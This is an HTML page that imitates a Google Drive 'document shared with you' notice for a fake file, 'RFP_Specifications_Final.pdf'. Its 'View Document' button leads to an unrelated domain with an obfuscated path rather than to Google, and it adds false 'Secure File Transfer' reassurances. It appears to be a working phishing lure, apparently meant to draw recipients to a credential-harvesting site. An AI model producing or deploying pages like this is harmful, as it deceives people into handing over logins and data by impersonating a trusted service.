<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Drive - View Document</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="main-container">
        <div class="view-card">
            <div class="header">
                <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M14 2H6C4.9 2 4 2.9 4 4V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V8L14 2Z" fill="#4285F4"/>
                    <path d="M14 2V8H20L14 2Z" fill="#A1C2FA"/>
                </svg>
                <h1>Document shared with you</h1>
                <p>A private file has been prepared for your review.</p>
            </div>

            <div class="file-preview-area">
                <div class="file-item">
                    <span class="file-thumb">📑</span>
                    <div class="file-meta">
                        <span class="file-title">RFP_Specifications_Final.pdf</span>
                        <span class="file-info">PDF Document • 1.4 MB</span>
                    </div>
                </div>
            </div>

            <div class="action-zone">
                <a href="https://founder.deciobo.solutions/0UQQj0iXO5rEMJgCnVeD@O/" class="btn-primary">View Document</a>
            </div>

            <div class="security-footer">
                <p>Shared via Secure File Transfer</p>
                <div class="divider"></div>
                <p class="disclaimer">This link is private and intended only for the recipient.</p>
            </div>
        </div>
    </div>
</body>
</html>
